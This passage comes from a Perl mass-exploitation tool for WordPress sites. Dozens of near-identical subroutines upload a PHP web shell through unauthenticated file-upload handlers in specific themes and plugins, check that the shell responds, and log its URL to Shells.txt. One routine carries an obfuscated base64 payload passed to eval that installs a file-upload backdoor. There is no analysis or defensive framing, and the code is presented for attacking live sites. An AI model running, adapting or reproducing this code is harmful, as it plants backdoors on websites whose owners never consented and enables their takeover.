print color('bold white'),"Shell Uploaded Successfully\n";
print color('bold BRIGHT_MAGENTA'),"  [Link] => $addblockup\n";
open (TEXT, '>>Shells.txt');
print TEXT "$addblockup\n";
close (TEXT);
threads->exit();
}else{
print color('bold red'),"[";
print color('bold green'),"WordPress";
print color('bold red'),"]==> ";
print color('bold red'),"[";
print color('bold cyan'),"$site";
print color('bold red'),"] ";
print color('bold white'),"ThisWay";
print color('bold white')," ---> ";
print color('bold red'),"Failed";
print color('bold white'),"\n";}
}
################ cubed #####################
sub cubedaade(){

my $addblockurl = "$site/wp-content/themes/theagency/includes/uploadify/uploadify.php";
my $response = $ua->post($addblockurl, Content_Type => 'multipart/form-data', Content => [file => ["tool/priv.php"],]);
$addblockup="$site/wp-content/themes/theagency/includes/uploadify/uploads/priv.php?c=izo";
my $checkaddblock = $ua->get("$addblockup")->content;

if($checkaddblock =~/izocin/) {
print color('bold red'),"[";
print color('bold green'),"WordPress";
print color('bold red'),"]==> ";
print color('bold red'),"[";
print color('bold cyan'),"$site";
print color('bold red'),"] ";
print color('bold white'),"theagency";
print color('bold white')," ---> ";
print color('bold white'),"";
print color('bold green'),"VULN";
print color('bold white'),"\n";
print color('bold green')," [";
print color('bold red'),"$site";
print color('bold green'),"] ";
print color('bold white'),"Shell Uploaded Successfully\n";
print color('bold BRIGHT_MAGENTA'),"  [Link] => $addblockup\n";
open (TEXT, '>>Shells.txt');
print TEXT "$addblockup\n";
close (TEXT);
threads->exit();
}else{
print color('bold red'),"[";
print color('bold green'),"WordPress";
print color('bold red'),"]==> ";
print color('bold red'),"[";
print color('bold cyan'),"$site";
print color('bold red'),"] ";
print color('bold white'),"theagency";
print color('bold white')," ---> ";
print color('bold red'),"Failed";
print color('bold white'),"\n";}
}
sub cubednb(){

my $addblockurl = "$site/wp-content/themes/switchblade/framework/_scripts/valums_uploader/php.php";
my $response = $ua->post($addblockurl, Content_Type => 'multipart/form-data', Content => [qqfile => ["tool/priv.php"],]);
$addblockup="$site/wp-content/uploads/$year/$month/priv.php?c=izo";
my $checkaddblock = $ua->get("$addblockup")->content;

if($checkaddblock =~/izocin/) {
print color('bold red'),"[";
print color('bold green'),"WordPress";
print color('bold red'),"]==> ";
print color('bold red'),"[";
print color('bold cyan'),"$site";
print color('bold red'),"] ";
print color('bold white'),"switchblade";
print color('bold white')," ---> ";
print color('bold white'),"";
print color('bold green'),"VULN";
print color('bold white'),"\n";
print color('bold green')," [";
print color('bold red'),"$site";
print color('bold green'),"] ";
print color('bold white'),"Shell Uploaded Successfully\n";
print color('bold BRIGHT_MAGENTA'),"  [Link] => $addblockup\n";
open (TEXT, '>>Shells.txt');
print TEXT "$addblockup\n";
close (TEXT);
threads->exit();
}else{
print color('bold red'),"[";
print color('bold green'),"WordPress";
print color('bold red'),"]==> ";
print color('bold red'),"[";
print color('bold cyan'),"$site";
print color('bold red'),"] ";
print color('bold white'),"switchblade";
print color('bold white')," ---> ";
print color('bold red'),"Failed";
print color('bold white'),"\n";}
}
################ cubed #####################
sub cubedfgy(){

my $addblockurl = "$site/wp-content/themes/atom/uploadify/uploadify.php";
my $response = $ua->post($addblockurl, Content_Type => 'multipart/form-data', Content => [Filedata => ["tool/priv.php"],'folder' => '/']);
$addblockup="$site/wp-content/themes/atom/uploadify/uploads/priv.php?c=izo";
my $checkaddblock = $ua->get("$addblockup")->content;

if($checkaddblock =~/izocin/) {
print color('bold red'),"[";
print color('bold green'),"WordPress";
print color('bold red'),"]==> ";
print color('bold red'),"[";
print color('bold cyan'),"$site";
print color('bold red'),"] ";
print color('bold white'),"atom";
print color('bold white')," ---> ";
print color('bold white'),"";
print color('bold green'),"VULN";
print color('bold white'),"\n";
print color('bold green')," [";
print color('bold red'),"$site";
print color('bold green'),"] ";
print color('bold white'),"Shell Uploaded Successfully\n";
print color('bold BRIGHT_MAGENTA'),"  [Link] => $addblockup\n";
open (TEXT, '>>Shells.txt');
print TEXT "$addblockup\n";
close (TEXT);
threads->exit();
}else{
print color('bold red'),"[";
print color('bold green'),"WordPress";
print color('bold red'),"]==> ";
print color('bold red'),"[";
print color('bold cyan'),"$site";
print color('bold red'),"] ";
print color('bold white'),"atom";
print color('bold white')," ---> ";
print color('bold red'),"Failed";
print color('bold white'),"\n";}
}
################ cubed #####################
sub cubedfgya(){

my $addblockurl = "$site/wp-content/themes/purevision/scripts/admin/uploadify/uploadify.php";
my $response = $ua->post($addblockurl, Content_Type => 'multipart/form-data', Content => [Filedata => ["tool/priv.php"],'folder' => '/']);
$addblockup="$site/priv.php?c=izo";
my $checkaddblock = $ua->get("$addblockup")->content;

if($checkaddblock =~/izocin/) {
print color('bold red'),"[";
print color('bold green'),"WordPress";
print color('bold red'),"]==> ";
print color('bold red'),"[";
print color('bold cyan'),"$site";
print color('bold red'),"] ";
print color('bold white'),"purevision";
print color('bold white')," ---> ";
print color('bold white'),"";
print color('bold green'),"VULN";
print color('bold white'),"\n";
print color('bold green')," [";
print color('bold red'),"$site";
print color('bold green'),"] ";
print color('bold white'),"Shell Uploaded Successfully\n";
print color('bold BRIGHT_MAGENTA'),"  [Link] => $addblockup\n";
open (TEXT, '>>Shells.txt');
print TEXT "$addblockup\n";
close (TEXT);
threads->exit();
}else{
print color('bold red'),"[";
print color('bold green'),"WordPress";
print color('bold red'),"]==> ";
print color('bold red'),"[";
print color('bold cyan'),"$site";
print color('bold red'),"] ";
print color('bold white'),"purevision";
print color('bold white')," ---> ";
print color('bold red'),"Failed";
print color('bold white'),"\n";}
}
################ cubed #####################
sub cubedoh(){

my $addblockurl = "$site/wp-content/themes/magnitudo/framework/_scripts/valums_uploader/php.php";
my $response = $ua->post($addblockurl, Content_Type => 'multipart/form-data', Content => [qqfile => ["tool/priv.php"],]);
$addblockup="$site/wp-content/uploads/$year/$month/priv.php?c=izo";
my $checkaddblock = $ua->get("$addblockup")->content;

if($checkaddblock =~/izocin/) {
print color('bold red'),"[";
print color('bold green'),"WordPress";
print color('bold red'),"]==> ";
print color('bold red'),"[";
print color('bold cyan'),"$site";
print color('bold red'),"] ";
print color('bold white'),"magnitudo";
print color('bold white')," ---> ";
print color('bold white'),"";
print color('bold green'),"VULN";
print color('bold white'),"\n";
print color('bold green')," [";
print color('bold red'),"$site";
print color('bold green'),"] ";
print color('bold white'),"Shell Uploaded Successfully\n";
print color('bold BRIGHT_MAGENTA'),"  [Link] => $addblockup\n";
open (TEXT, '>>Shells.txt');
print TEXT "$addblockup\n";
close (TEXT);
threads->exit();
}else{
print color('bold red'),"[";
print color('bold green'),"WordPress";
print color('bold red'),"]==> ";
print color('bold red'),"[";
print color('bold cyan'),"$site";
print color('bold red'),"] ";
print color('bold white'),"magnitudo";
print color('bold white')," ---> ";
print color('bold red'),"Failed";
print color('bold white'),"\n";}
}
################ cubed #####################
sub cubed(){

my $addblockurl = "$site/wp-content/themes/cubed_v1.2/functions/upload-handler.php";
my $response = $ua->post($addblockurl, Content_Type => 'multipart/form-data', Content => [uploadfile => ["tool/priv.php"],]);
$addblockup="$site/wp-content/uploads/$year/$month/priv.php?c=izo";
my $checkaddblock = $ua->get("$addblockup")->content;

if($checkaddblock =~/izocin/) {
print color('bold red'),"[";
print color('bold green'),"WordPress";
print color('bold red'),"]==> ";
print color('bold red'),"[";
print color('bold cyan'),"$site";
print color('bold red'),"] ";
print color('bold white'),"cubed_v1.2 thme";
print color('bold white')," ---> ";
print color('bold white'),"";
print color('bold green'),"VULN";
print color('bold white'),"\n";
print color('bold green')," [";
print color('bold red'),"$site";
print color('bold green'),"] ";
print color('bold white'),"Shell Uploaded Successfully\n";
print color('bold BRIGHT_MAGENTA'),"  [Link] => $addblockup\n";
open (TEXT, '>>Shells.txt');
print TEXT "$addblockup\n";
close (TEXT);
threads->exit();
}else{
print color('bold red'),"[";
print color('bold green'),"WordPress";
print color('bold red'),"]==> ";
print color('bold red'),"[";
print color('bold cyan'),"$site";
print color('bold red'),"] ";
print color('bold white'),"cubed_v1.2 thme";
print color('bold white')," ---> ";
print color('bold red'),"Failed";
print color('bold white'),"\n";}
}
################ cubed #####################
sub rhgty(){

my $addblockurl = "$site/wp-content/themes/RightNow/includes/uploadify/upload_settings_image.php";
my $response = $ua->post($addblockurl, Content_Type => 'multipart/form-data', Content => [Filedata => ["tool/priv.php"],]);
$addblockup="$site/wp-content/uploads/settingsimages/priv.php?c=izo";
my $checkaddblock = $ua->get("$addblockup")->content;

if($checkaddblock =~/izocin/) {
print color('bold red'),"[";
print color('bold green'),"WordPress";
print color('bold red'),"]==> ";
print color('bold red'),"[";
print color('bold cyan'),"$site";
print color('bold red'),"] ";
print color('bold white'),"RightNow thmess";
print color('bold white')," ---> ";
print color('bold white'),"";
print color('bold green'),"VULN";
print color('bold white'),"\n";
print color('bold green')," [";
print color('bold red'),"$site";
print color('bold green'),"] ";
print color('bold white'),"Shell Uploaded Successfully\n";
print color('bold BRIGHT_MAGENTA'),"  [Link] => $addblockup\n";
open (TEXT, '>>Shells.txt');
print TEXT "$addblockup\n";
close (TEXT);
threads->exit();
}else{
print color('bold red'),"[";
print color('bold green'),"WordPress";
print color('bold red'),"]==> ";
print color('bold red'),"[";
print color('bold cyan'),"$site";
print color('bold red'),"] ";
print color('bold white'),"RightNow thmess";
print color('bold white')," ---> ";
print color('bold red'),"Failed";
print color('bold white'),"\n";}
}
################ cubed #####################
sub dzupx(){

my $addblockurl = "$site/wp-content/plugins/Tevolution/tmplconnector/monetize/templatic-custom_fields/single-upload.php";
my $response = $ua->post($addblockurl, Content_Type => 'multipart/form-data', Content => [file => ["tool/priv.php"],]);
if ($response->content =~ /"(.*?)"/) {
$uploadfolder=$1.'?c=izo';
}
$addblockup="$site/wp-content/uploads/settingsimages/$year/$month/$uploadfolder";
my $checkaddblock = $ua->get("$addblockup")->content;

if($checkaddblock =~/izocin/) {
print color('bold red'),"[";
print color('bold green'),"WordPress";
print color('bold red'),"]==> ";
print color('bold red'),"[";
print color('bold cyan'),"$site";
print color('bold red'),"] ";
print color('bold white'),"Tevolution plug";
print color('bold white')," ---> ";
print color('bold white'),"";
print color('bold green'),"VULN";
print color('bold white'),"\n";
print color('bold green')," [";
print color('bold red'),"$site";
print color('bold green'),"] ";
print color('bold white'),"Shell Uploaded Successfully\n";
print color('bold BRIGHT_MAGENTA'),"  [Link] => $addblockup\n";
open (TEXT, '>>Shells.txt');
print TEXT "$addblockup\n";
close (TEXT);
threads->exit();
}else{
print color('bold red'),"[";
print color('bold green'),"WordPress";
print color('bold red'),"]==> ";
print color('bold red'),"[";
print color('bold cyan'),"$site";
print color('bold red'),"] ";
print color('bold white'),"Tevolution plug";
print color('bold white')," ---> ";
print color('bold red'),"Failed";
print color('bold white'),"\n";}
}
################ cubed #####################
sub rhgbbrt(){

my $addblockurl = "$site/wp-content/plugins/html5avmanager/lib/uploadify/custom.php";
my $response = $ua->post($addblockurl, Content_Type => 'multipart/form-data', Content => [Filedata => ["tool/priv.php"],]);
$addblockup="$site/wp-content/videoaudio/temp/priv.php?c=izo";
my $checkaddblock = $ua->get("$addblockup")->content;

if($checkaddblock =~/izocin/) {
print color('bold red'),"[";
print color('bold green'),"WordPress";
print color('bold red'),"]==> ";
print color('bold red'),"[";
print color('bold cyan'),"$site";
print color('bold red'),"] ";
print color('bold white'),"html5avmanager";
print color('bold white')," ---> ";
print color('bold white'),"";
print color('bold green'),"VULN";
print color('bold white'),"\n";
print color('bold green')," [";
print color('bold red'),"$site";
print color('bold green'),"] ";
print color('bold white'),"Shell Uploaded Successfully\n";
print color('bold BRIGHT_MAGENTA'),"  [Link] => $addblockup\n";
open (TEXT, '>>Shells.txt');
print TEXT "$addblockup\n";
close (TEXT);
threads->exit();
}else{
print color('bold red'),"[";
print color('bold green'),"WordPress";
print color('bold red'),"]==> ";
print color('bold red'),"[";
print color('bold cyan'),"$site";
print color('bold red'),"] ";
print color('bold white'),"html5avmanager";
print color('bold white')," ---> ";
print color('bold red'),"Failed";
print color('bold white'),"\n";}
}
################ cubed #####################
sub rhgbb(){

my $addblockurl = "$site/wp-content/plugins/dzs-videowhisper/upload.php";
my $response = $ua->post($addblockurl, Content_Type => 'multipart/form-data', Content => [file_field => ["tool/priv.phtml"],]);
$addblockup="$site/wp-content/plugins/dzs-videowhisper/upload/priv.phtml?c=izo";
my $checkaddblock = $ua->get("$addblockup")->content;

if($checkaddblock =~/izocin/) {
print color('bold red'),"[";
print color('bold green'),"WordPress";
print color('bold red'),"]==> ";
print color('bold red'),"[";
print color('bold cyan'),"$site";
print color('bold red'),"] ";
print color('bold white'),"dzs-videowhisper";
print color('bold white')," ---> ";
print color('bold white'),"";
print color('bold green'),"VULN";
print color('bold white'),"\n";
print color('bold green')," [";
print color('bold red'),"$site";
print color('bold green'),"] ";
print color('bold white'),"Shell Uploaded Successfully\n";
print color('bold BRIGHT_MAGENTA'),"  [Link] => $addblockup\n";
open (TEXT, '>>Shells.txt');
print TEXT "$addblockup\n";
close (TEXT);
threads->exit();
}else{
print color('bold red'),"[";
print color('bold green'),"WordPress";
print color('bold red'),"]==> ";
print color('bold red'),"[";
print color('bold cyan'),"$site";
print color('bold red'),"] ";
print color('bold white'),"dzs-videowhisper";
print color('bold white')," ---> ";
print color('bold red'),"Failed";
print color('bold white'),"\n";}
}
################ Com Media #####################
sub comsxx(){
my $url = "$site/wp-content/plugins/contus-video-galleryversion-10/upload1.php";
my $inn ="tool/priv.php";
my $field_name = "myfile";

my $response = $ua->post( $url,
            Content_Type => 'multipart/form-data',
            Content => [ $field_name => ["$inn"],"mode" => "image" ]
           
            );
if ($response->content =~ /(.*?)php/) {
$uploadfolder=$1.'php?c=izo';
}			

$mediauph="$site/wp-content/uploads/$uploadfolder";

$checkpofwuph = $ua->get("$mediauph")->content;
if($checkpofwuph =~/izocin/) {
print color('bold red'),"[";
print color('bold green'),"WordPress";
print color('bold red'),"]==> ";
print color('bold red'),"[";
print color('bold cyan'),"$site";
print color('bold red'),"] ";
print color('bold white'),"galleryversion Shel";
print color('bold white')," ---> ";
print color('bold green'),"VULN\n";
print color('bold green')," [";
print color('bold red'),"$site";
print color('bold green'),"] ";
print color('bold white'),"Shell Uploaded Successfully\n";
print color('bold BRIGHT_MAGENTA'),"  [Link] => $mediauph\n";
open (TEXT, '>>shells.txt');
print TEXT "$mediauph\n";
close (TEXT);
threads->exit();
}else{
print color('bold red'),"[";
print color('bold green'),"WordPress";
print color('bold red'),"]==> ";
print color('bold red'),"[";
print color('bold cyan'),"$site";
print color('bold red'),"] ";
print color('bold white'),"galleryversion";
print color('bold white')," ---> ";
print color('bold red'),"Failed\n";
}
}
################ comadsmanager #####################
sub comzzz(){
my $url = "$site/wp-content/themes/konzept/includes/uploadify/upload.php";

my $response = $ua->post( $url,
            Cookie => "", Content_Type => "form-data", Content => [file => ["tool/BackDoor.jpg"], name => "priv.php"]
           
            );

$comadsmanagerup="$site/wp-content/themes/konzept/includes/uploadify/uploads/priv.php?c=izo";

$checkcomadsmanagerup = $ua->get("$comadsmanagerup")->content;
if($checkcomadsmanagerup =~/izocin/) {
print color('bold red'),"[";
print color('bold green'),"WordPress";
print color('bold red'),"]==> ";
print color('bold red'),"[";
print color('bold cyan'),"$site";
print color('bold red'),"] ";
print color('bold white'),"konzept themess";
print color('bold white')," ---> ";
print color('bold green'),"VULN\n";
print color('bold green')," [";
print color('bold red'),"$site";
print color('bold green'),"] ";
print color('bold white'),"File Uploaded Successfully\n";
print color('bold BRIGHT_MAGENTA'),"  [Link] => $comadsmanagerup\n";
open (TEXT, '>>index.txt');
print TEXT "$comadsmanagerup\n";
close (TEXT);
threads->exit();
}else{
print color('bold red'),"[";
print color('bold green'),"WordPress";
print color('bold red'),"]==> ";
print color('bold red'),"[";
print color('bold cyan'),"$site";
print color('bold red'),"] ";
print color('bold white'),"konzept themess";
print color('bold white')," ---> ";
print color('bold red'),"Failed\n";
}
}
sub seoww(){ 
my $url = "$site/wp-content/plugins/seo-watcher/ofc/php-ofc-library/ofc_upload_image.php?name=test.php";

my $index='<?php
eval(bAsE64_DecOde("ZWNobyAnaXpvY2luPGJyPicucGhwX3VuYW1lKCkuJzxmb3JtIG1ldGhvZD0icG9zdCIgZW5jdHlwZT0ibXVsdGlwYXJ0L2Zvcm0tZGF0YSI+Jy4nPGlucHV0IHR5cGU9ImZpbGUiIG5hbWU9ImZpbGUiPjxpbnB1dCBuYW1lPSJfdXBsIiB0eXBlPSJzdWJtaXQiPjwvZm9ybT4nOwppZiggJF9QT1NUWydfdXBsJ10gKXtpZihAY29weSgkX0ZJTEVTWydmaWxlJ11bJ3RtcF9uYW1lJ10sICRfRklMRVNbJ2ZpbGUnXVsnbmFtZSddKSkgeyBlY2hvICdVcGxvYWQgT0snO31lbHNlIHtlY2hvICdVcGxvYWQgRmFpbCc7fX0="));
?>';
my $body = $ua->post( $url,
        Content_Type => 'multipart/form-data',
        Content => $index
        );

$zoomerup="$site/wp-content/plugins/seo-watcher/ofc/tmp-upload-images/test.php";

my $checkk = $ua->get("$zoomerup")->content;
if($checkk =~/izocin/) {
print color('bold red'),"[";
print color('bold green'),"WordPress";
print color('bold red'),"]==> ";
print color('bold red'),"[";
print color('bold cyan'),"$site";
print color('bold red'),"] ";
print color('bold white'),"wp Seowatcher";
print color('bold white')," ---> ";
print color('bold green'),"VULN";
print color('bold white'),"\n";
print color('bold green')," [";
print color('bold red'),"$site";
print color('bold green'),"] ";
print color('bold white'),"Shell Uploaded Successfully\n";
print color('bold BRIGHT_MAGENTA'),"  [Link] => $zoomerup\n";
open (TEXT, '>>Shells.txt');
print TEXT "$zoomerup\n";
close (TEXT);
threads->exit();
}else{
print color('bold red'),"[";
print color('bold green'),"WordPress";
print color('bold red'),"]==> ";
print color('bold red'),"[";
print color('bold cyan'),"$site";
print color('bold red'),"] ";
print color('bold white'),"wp Seowatcher";
print color('bold white')," ---> ";
print color('bold red'),"Failed";
print color('bold white'),"\n";
}
}
################ comadsmanager #####################
sub comzcc(){
my $url = "$site/wp-content/plugins/omni-secure-files/plupload/examples/upload.php";

my $response = $ua->post( $url,
            Cookie => "", Content_Type => "form-data", Content => [file => ["tool/BackDoor.jpg"], name => "priv.php"]
           
            );

$comadsmanagerup="$site/wp-content/plugins/omni-secure-files/plupload/examples/uploads/priv.php?c=izo";

$checkcomadsmanagerup = $ua->get("$comadsmanagerup")->content;
if($checkcomadsmanagerup =~/izocin/) {
print color('bold red'),"[";
print color('bold green'),"WordPress";
print color('bold red'),"]==> ";
print color('bold red'),"[";
print color('bold cyan'),"$site";
print color('bold red'),"] ";
print color('bold white'),"omni-secure-fil";
print color('bold white')," ---> ";
print color('bold green'),"VULN\n";
print color('bold green')," [";
print color('bold red'),"$site";
print color('bold green'),"] ";
print color('bold white'),"File Uploaded Successfully\n";
print color('bold BRIGHT_MAGENTA'),"  [Link] => $comadsmanagerup\n";
open (TEXT, '>>index.txt');
print TEXT "$comadsmanagerup\n";
close (TEXT);
threads->exit();
}else{
print color('bold red'),"[";
print color('bold green'),"WordPress";
print color('bold red'),"]==> ";
print color('bold red'),"[";
print color('bold cyan'),"$site";
print color('bold red'),"] ";
print color('bold white'),"omni-secure-fil";
print color('bold white')," ---> ";
print color('bold red'),"Failed\n";
}
}
################ pitchprint #####################
sub pith(){

my $addblockurl = "$site/wp-content/plugins/pitchprint/uploader/";
my $response = $ua->post($addblockurl, Content_Type => 'multipart/form-data', Content => ['files[]' => ["tool/priv.php"],]);
$addblockup="$site/wp-content/plugins/pitchprint/uploader/files/priv.php?c=izo";
my $checkaddblock = $ua->get("$addblockup")->content;

if($checkaddblock =~/izocin/) {
print color('bold red'),"[";
print color('bold green'),"WordPress";
print color('bold red'),"]==> ";
print color('bold red'),"[";
print color('bold cyan'),"$site";
print color('bold red'),"] ";
print color('bold white'),"pitchprint";
print color('bold white')," ---> ";
print color('bold white'),"";
print color('bold green'),"VULN";
print color('bold white'),"\n";
print color('bold green')," [";
print color('bold red'),"$site";
print color('bold green'),"] ";
print color('bold white'),"Shell Uploaded Successfully\n";
print color('bold BRIGHT_MAGENTA'),"  [Link] => $addblockup\n";
open (TEXT, '>>Shells.txt');
print TEXT "$addblockup\n";
close (TEXT);
threads->exit();
}else{
print color('bold red'),"[";
print color('bold green'),"WordPress";
print color('bold red'),"]==> ";
print color('bold red'),"[";
print color('bold cyan'),"$site";
print color('bold red'),"] ";
print color('bold white'),"pitchprint";
print color('bold white')," ---> ";
print color('bold red'),"Failed";
print color('bold white'),"\n";}
}
################ pitchprint #####################
sub satos(){

my $addblockurl = "$site/wp-content/themes/satoshi/upload-file.php";
my $response = $ua->post($addblockurl, Content_Type => 'multipart/form-data', Content => [uploadfile => ["tool/priv.php"],]);
$addblockup="$site/wp-content/satoshi/images/priv.php?c=izo";
my $checkaddblock = $ua->get("$addblockup")->content;

if($checkaddblock =~/izocin/) {
print color('bold red'),"[";
print color('bold green'),"WordPress";
print color('bold red'),"]==> ";
print color('bold red'),"[";
print color('bold cyan'),"$site";
print color('bold red'),"] ";
print color('bold white'),"satoshi";
print color('bold white')," ---> ";
print color('bold white'),"";
print color('bold green'),"VULN";
print color('bold white'),"\n";
print color('bold green')," [";
print color('bold red'),"$site";
print color('bold green'),"] ";
print color('bold white'),"Shell Uploaded Successfully\n";
print color('bold BRIGHT_MAGENTA'),"  [Link] => $addblockup\n";
open (TEXT, '>>Shells.txt');
print TEXT "$addblockup\n";
close (TEXT);
threads->exit();
}else{
print color('bold red'),"[";
print color('bold green'),"WordPress";
print color('bold red'),"]==> ";
print color('bold red'),"[";
print color('bold cyan'),"$site";
print color('bold red'),"] ";
print color('bold white'),"satoshi";
print color('bold white')," ---> ";
print color('bold red'),"Failed";
print color('bold white'),"\n";}
}
sub cusadx(){

my $addblockurl = "$site/wp-content/themes/radial-theme/functions/upload-handler.php";
my $response = $ua->post($addblockurl, Content_Type => 'multipart/form-data', Content => [orange_themes => ["tool/priv.php"],]);
$addblockup="$site/wp-content/uploads/$year/$month/priv.php?c=izo";
my $checkaddblock = $ua->get("$addblockup")->content;

if($checkaddblock =~/izocin/) {
print color('bold red'),"[";
print color('bold green'),"WordPress";
print color('bold red'),"]==> ";
print color('bold red'),"[";
print color('bold cyan'),"$site";
print color('bold red'),"] ";
print color('bold white'),"radial-theme";
print color('bold white')," ---> ";
print color('bold white'),"";
print color('bold green'),"VULN";
print color('bold white'),"\n";
print color('bold green')," [";
print color('bold red'),"$site";
print color('bold green'),"] ";
print color('bold white'),"Shell Uploaded Successfully\n";
print color('bold BRIGHT_MAGENTA'),"  [Link] => $addblockup\n";
open (TEXT, '>>Shells.txt');
print TEXT "$addblockup\n";
close (TEXT);
threads->exit();
}else{
print color('bold red'),"[";
print color('bold green'),"WordPress";
print color('bold red'),"]==> ";
print color('bold red'),"[";
print color('bold cyan'),"$site";
print color('bold red'),"] ";
print color('bold white'),"radial-theme";
print color('bold white')," ---> ";
print color('bold red'),"Failed";
print color('bold white'),"\n";}
}
################ pinboart #####################
sub pinb(){

my $addblockurl = "$site/wp-content/themes/pinboard/themify/themify-ajax.php?upload=1";
my $response = $ua->post($addblockurl, Content_Type => 'multipart/form-data', Content => [Filedata => ["tool/priv.php"],]);
$addblockup="$site/wp-content/themes/pinboard/uploads/priv.php?c=izo";
my $checkaddblock = $ua->get("$addblockup")->content;

if($checkaddblock =~/izocin/) {
print color('bold red'),"[";
print color('bold green'),"WordPress";
print color('bold red'),"]==> ";
print color('bold red'),"[";
print color('bold cyan'),"$site";
print color('bold red'),"] ";
print color('bold white'),"pinboard";
print color('bold white')," ---> ";
print color('bold white'),"";
print color('bold green'),"VULN";
print color('bold white'),"\n";
print color('bold green')," [";
print color('bold red'),"$site";
print color('bold green'),"] ";
print color('bold white'),"Shell Uploaded Successfully\n";
print color('bold BRIGHT_MAGENTA'),"  [Link] => $addblockup\n";
open (TEXT, '>>Shells.txt');
print TEXT "$addblockup\n";
close (TEXT);
threads->exit();
}else{
print color('bold red'),"[";
print color('bold green'),"WordPress";
print color('bold red'),"]==> ";
print color('bold red'),"[";
print color('bold cyan'),"$site";
print color('bold red'),"] ";
print color('bold white'),"pinboard";
print color('bold white')," ---> ";
print color('bold red'),"Failed";
print color('bold white'),"\n";}
}################ pinboart #####################
sub barc(){

my $addblockurl = "$site/wp-content/plugins/barclaycart/uploadify/uploadify.php";
my $response = $ua->post($addblockurl, Content_Type => 'multipart/form-data', Content => [Filedata => ["tool/priv.php"],]);
$addblockup="$site/wp-content/plugins/barclaycart/uploadify/priv.php?c=izo";
my $checkaddblock = $ua->get("$addblockup")->content;

if($checkaddblock =~/izocin/) {
print color('bold red'),"[";
print color('bold green'),"WordPress";
print color('bold red'),"]==> ";
print color('bold red'),"[";
print color('bold cyan'),"$site";
print color('bold red'),"] ";
print color('bold white'),"barclaycart";
print color('bold white')," ---> ";
print color('bold white'),"";
print color('bold green'),"VULN";
print color('bold white'),"\n";
print color('bold green')," [";
print color('bold red'),"$site";
print color('bold green'),"] ";
print color('bold white'),"Shell Uploaded Successfully\n";
print color('bold BRIGHT_MAGENTA'),"  [Link] => $addblockup\n";
open (TEXT, '>>Shells.txt');
print TEXT "$addblockup\n";
close (TEXT);
threads->exit();
}else{
print color('bold red'),"[";
print color('bold green'),"WordPress";
print color('bold red'),"]==> ";
print color('bold red'),"[";
print color('bold cyan'),"$site";
print color('bold red'),"] ";;
print color('bold white'),"barclaycart";
print color('bold white')," ---> ";
print color('bold red'),"Failed";
print color('bold white'),"\n";}
}
sub bard(){

my $addblockurl = "$site/wp-content/plugins/wpstorecart/php/upload.php";
my $response = $ua->post($addblockurl, Content_Type => 'multipart/form-data', Content => [Filedata => ["tool/priv.php"],]);
$addblockup="$site/wp-content/uploads/wpstorecart/priv.php?c=izo";
my $checkaddblock = $ua->get("$addblockup")->content;

if($checkaddblock =~/izocin/) {
print color('bold red'),"[";
print color('bold green'),"WordPress";
print color('bold red'),"]==> ";
print color('bold red'),"[";
print color('bold cyan'),"$site";
print color('bold red'),"] ";
print color('bold white'),"wpstorecart";
print color('bold white')," ---> ";
print color('bold white'),"";
print color('bold green'),"VULN";
print color('bold white'),"\n";
print color('bold green')," [";
print color('bold red'),"$site";
print color('bold green'),"] ";
print color('bold white'),"Shell Uploaded Successfully\n";
print color('bold BRIGHT_MAGENTA'),"  [Link] => $addblockup\n";
open (TEXT, '>>Shells.txt');
print TEXT "$addblockup\n";
close (TEXT);
threads->exit();
}else{
print color('bold red'),"[";
print color('bold green'),"WordPress";
print color('bold red'),"]==> ";
print color('bold red'),"[";
print color('bold cyan'),"$site";
print color('bold red'),"] ";
print color('bold white'),"wpstorecart";
print color('bold white')," ---> ";
print color('bold red'),"Failed";
print color('bold white'),"\n";}
}
sub army(){

my $addblockurl = "$site/wp-content/themes/armyknife/functions/upload-handler.php";
my $response = $ua->post($addblockurl, Content_Type => 'multipart/form-data', Content => [uploadfile => ["tool/priv.php"],]);
$addblockup="$site/wp-content/uploads/$year/$month/priv.php?c=izo";
my $checkaddblock = $ua->get("$addblockup")->content;

if($checkaddblock =~/izocin/) {
print color('bold red'),"[";
print color('bold green'),"WordPress";
print color('bold red'),"]==> ";
print color('bold red'),"[";
print color('bold cyan'),"$site";
print color('bold red'),"] ";
print color('bold white'),"armyknife";
print color('bold white')," ---> ";
print color('bold white'),"";
print color('bold green'),"VULN";
print color('bold white'),"\n";
print color('bold green')," [";
print color('bold red'),"$site";
print color('bold green'),"] ";
print color('bold white'),"Shell Uploaded Successfully\n";
print color('bold BRIGHT_MAGENTA'),"  [Link] => $addblockup\n";
open (TEXT, '>>Shells.txt');
print TEXT "$addblockup\n";
close (TEXT);
threads->exit();
}else{
print color('bold red'),"[";
print color('bold green'),"WordPress";
print color('bold red'),"]==> ";
print color('bold red'),"[";
print color('bold cyan'),"$site";
print color('bold red'),"] ";
print color('bold white'),"armyknife";
print color('bold white')," ---> ";
print color('bold red'),"Failed";
print color('bold white'),"\n";}
}
sub asrd(){

my $addblockurl = "$site/wp-content/plugins/asset-manager/upload.php";
my $response = $ua->post($addblockurl, Content_Type => 'multipart/form-data', Content => [Filedata => ["tool/priv.php"],]);
$addblockup="$site/wp-content/uploads/assets/temp/priv.php?c=izo";
my $checkaddblock = $ua->get("$addblockup")->content;

if($checkaddblock =~/izocin/) {
print color('bold red'),"[";
print color('bold green'),"WordPress";
print color('bold red'),"]==> ";
print color('bold red'),"[";
print color('bold cyan'),"$site";
print color('bold red'),"] ";
print color('bold white'),"asset-manager";
print color('bold white')," ---> ";
print color('bold white'),"";
print color('bold green'),"VULN";
print color('bold white'),"\n";
print color('bold green')," [";
print color('bold red'),"$site";
print color('bold green'),"] ";
print color('bold white'),"Shell Uploaded Successfully\n";
print color('bold BRIGHT_MAGENTA'),"  [Link] => $addblockup\n";
open (TEXT, '>>Shells.txt');
print TEXT "$addblockup\n";
close (TEXT);
threads->exit();
}else{
print color('bold red'),"[";
print color('bold green'),"WordPress";
print color('bold red'),"]==> ";
print color('bold red'),"[";
print color('bold cyan'),"$site";
print color('bold red'),"] ";
print color('bold white'),"asset-manager";
print color('bold white')," ---> ";
print color('bold red'),"Failed";
print color('bold white'),"\n";}
}
################ evolvet #####################
sub evol(){

my $addblockurl = "$site/wp-content/themes/evolve/js/back-end/libraries/fileuploader/upload_handler.php";
my $response = $ua->post($addblockurl, Content_Type => 'multipart/form-data', Content => [qqfile => ["tool/priv.php"],]);
$addblockup="$site/wp-content/uploads/$year/$month/priv.php?c=izo";
my $checkaddblock = $ua->get("$addblockup")->content;

if($checkaddblock =~/izocin/) {
print color('bold red'),"[";
print color('bold green'),"WordPress";
print color('bold red'),"]==> ";
print color('bold red'),"[";
print color('bold cyan'),"$site";
print color('bold red'),"] ";
print color('bold white'),"evolve";
